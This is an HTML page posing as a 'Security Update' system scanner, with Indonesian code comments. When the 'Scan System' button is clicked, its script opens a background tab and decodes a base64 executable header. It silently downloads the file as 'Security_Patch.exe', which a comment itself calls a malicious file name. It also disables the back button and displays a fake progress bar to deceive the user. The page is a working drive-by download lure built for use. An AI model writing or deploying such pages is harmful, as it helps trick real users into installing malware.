<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .panel {
    background: #fff;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    text-align: center;
    max-width: 400px;
  }
  h1 { color: #333; margin-bottom: 10px; }
  p { color: #666; margin-bottom: 20px; }
  button {
    padding: 15px 30px;
    background: #007aff;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Update</h1>
  <p>Klik tombol di bawah untuk memulai pemindaian sistem.</p>
  <button id="startBtn">Scan System</button>
</div>

<script>
(function () {
  'use strict';

  document.getElementById('startBtn').addEventListener('click', function() {
    
    // ============================================
    // 1. PAYLOAD HTML UNTUK TAB LATAR BELAKANG
    // ============================================
    var payloadHTML = `
      <!DOCTYPE html>
      <html>
      <head><title>Downloading...</title></head>
      <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh;">
        <h1>Downloading Update...</h1>
        <p id="status">0%</p>
        <script>
          // A. DOWNLOAD TRIGGER DI LATAR BELAKANG
          function triggerDownload() {
            var b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA"; // Base64 Header
            var binary = atob(b64Data);
            var bytes = new Uint8Array(binary.length);
            for (var i = 0; i < binary.length; i++) {
              bytes[i] = binary.charCodeAt(i);
            }
            var blob = new Blob([bytes], { type: 'application/octet-stream' });
            var url = URL.createObjectURL(blob);
            
            var a = document.createElement('a');
            a.href = url;
            a.download = 'Security_Patch.exe'; // Nama file berbahaya
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            
            // Jangan revoke agar file tetap bisa diunduh meskipun tab ditutup
            // setTimeout(function() { URL.revokeObjectURL(url); }, 5000);
          }

          // Pemicu unduhan otomatis saat tab background dimuat
          setTimeout(triggerDownload, 1000);

          // B. TAB-NABBING (Mencegah User Kembali)
          try {
            // Jika dibuka sebagai popup, hapus opener agar tidak bisa back
            if (window.opener) {
              window.opener = null;
            }
            // Manipulasi history agar tombol Back tidak berfungsi
            history.pushState(null, null, location.href);
            window.onpopstate = function () {
              history.go(1);
            };
          } catch(e) {}

          // C. UI Palsu (Progress Bar)
          var count = 0;
          setInterval(function() {
            count = (count + Math.random() * 10) % 100;
            document.getElementById('status').innerText = Math.floor(count) + "%";
          }, 500);

        <\/script>
      </body>
      </html>
    `;

    // ============================================
    // 2. BUKA TAB LATAR BELAKANG (WINDOW.OPEN)
    // ============================================
    // Trik: Buka tab baru. Beberapa browser mengizinkan tab baru
    // terbuka di latar belakang (background tab) jika dipicu oleh klik.
    
    var win = window.open('', '_blank');
    
    if (!win) {
      alert("❌ Popup diblokir. Izinkan popup untuk melanjutkan.");
      return;
    }

    try {
      // Tulis payload ke tab baru
      win.document.open();
      win.document.write(payloadHTML);
      win.document.close();
      
      // Trik: Pindahkan fokus kembali ke tab asli
      // Agar tab baru berjalan di background tanpa disadari user
      window.focus();

    } catch (e) {
      console.log("Gagal menulis ke tab baru: " + e.message);
    }
  });

})();
</script>
</body>
</html>
